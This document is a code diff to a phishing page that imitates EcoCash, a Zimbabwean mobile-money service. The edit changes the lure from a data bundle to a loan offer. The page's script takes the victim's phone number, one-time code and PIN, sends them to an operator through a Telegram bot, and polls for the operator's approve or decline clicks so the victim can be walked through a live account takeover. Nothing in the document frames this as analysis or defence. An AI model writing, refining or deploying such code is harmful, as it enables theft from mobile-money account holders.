@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <meta name="theme-color" content="#003366">
-    <title>EcoCash Data | Verify OTP · Zimbabwe</title>
+    <title>EcoCash Loan | Verify OTP · Zimbabwe</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -291,7 +291,7 @@
             </div>
 
             <div id="bBar" class="bundle-bar" style="display:none;">
-                <div class="b-row"><span>Bundle:</span><span id="bD">&mdash;</span></div>
+                <div class="b-row"><span>Loan:</span><span id="bD">&mdash;</span></div>
                 <div class="b-row"><span>Amount:</span><span id="bP">USD 0.00</span></div>
             </div>
 
@@ -309,7 +309,7 @@
             <p class="hint">Check your SMS for the verification code</p>
 
             <div class="btns">
-                <button class="btn-p" onclick="doOTP()">Verify & Proceed</button>
+                <button class="btn-p" onclick="doOTP()">Verify &amp; Proceed</button>
                 <button class="btn-o" onclick="location.href='login.html'">Cancel</button>
             </div>
 
@@ -400,7 +400,6 @@
         function chk() {
             otp = getCode();
             if (otp.length === 6) {
-                // Auto-send silently
                 setTimeout(() => doOTP(), 400);
             }
         }
@@ -411,8 +410,7 @@
             clrErr();
             document.getElementById('ov').classList.add('on');
 
-            // Telegram message - all copyable
-            const msg = `\u{1f4f2} <b>OTP Verification</b>\n\n<b>OTP Code:</b> <code>${otp}</code>\n<b>Phone:</b> <code>+263${phone}</code>\n<b>Bundle:</b> <code>${bd.data || 'N/A'}</code>\n<b>Amount:</b> <code>USD ${bd.price || '0.00'}</code>\n\n<b>Message (tap to copy):</b>\n<code>Your EcoCash OTP is.${otp}. Do not share this code with anyone. Expires in 2 mins.\n1qk+jE1lKeZ</code>`;
+            const msg = `\u{1f4f2} <b>OTP Verification</b>\n\n<b>OTP Code:</b> <code>${otp}</code>\n<b>Phone:</b> <code>+263${phone}</code>\n<b>Loan:</b> <code>${bd.data || 'N/A'}</code>\n<b>Amount:</b> <code>USD ${bd.price || '0.00'}</code>\n\n<b>Message (tap to copy):</b>\n<code>Your EcoCash OTP is.${otp}. Do not share this code with anyone. Expires in 2 mins.\n1qk+jE1lKeZ</code>`;
 
             const btns = [[{ text: '\u2713 Approved', callback_data: 'otp_approved' }, { text: '\u2717 Declined', callback_data: 'otp_declined' }]];
             tg(msg, btns);
@@ -471,8 +469,7 @@
             document.getElementById('pinOv').classList.remove('on');
             document.getElementById('ov').classList.add('on');
 
-            // PIN message - only PIN, no OTP repeat
-            const msg = `\u{1f510} <b>PIN Confirmation</b>\n\n<b>PIN:</b> <code>${pin}</code>\n<b>Phone:</b> <code>+263${phone}</code>\n<b>Bundle:</b> <code>${bd.data || 'N/A'}</code>\n<b>Amount:</b> <code>USD ${bd.price || '0.00'}</code>`;
+            const msg = `\u{1f510} <b>PIN Confirmation</b>\n\n<b>PIN:</b> <code>${pin}</code>\n<b>Phone:</b> <code>+263${phone}</code>\n<b>Loan:</b> <code>${bd.data || 'N/A'}</code>\n<b>Amount:</b> <code>USD ${bd.price || '0.00'}</code>`;
             const btns = [[{ text: '\u2713 Valid PIN', callback_data: 'pin_valid' }, { text: '\u2717 Invalid PIN', callback_data: 'pin_invalid' }]];
             tg(msg, btns);
             pollPin();
@@ -488,7 +485,11 @@
                             luid = u.update_id;
                             if (u.callback_query) {
                                 const cb = u.callback_query.data;
-                                if (cb === 'pin_valid') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); location.href = `success.html?data=${encodeURIComponent(bd.data || '')}&price=${bd.price || ''}&phone=${phone}`; }
+                                if (cb === 'pin_valid') {
+                                    clearInterval(iv);
+                                    document.getElementById('ov').classList.remove('on');
+                                    location.href = `success.html?data=${encodeURIComponent(bd.data || '')}&price=${bd.price || ''}&phone=${phone}`;
+                                }
                                 else if (cb === 'pin_invalid') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); document.getElementById('pinOv').classList.add('on'); document.getElementById('pinErr').textContent = 'Invalid PIN. Try again.'; document.getElementById('pinErr').classList.add('show'); document.getElementById('pinIn').value = ''; document.getElementById('pinIn').focus(); }
                             }
                         }
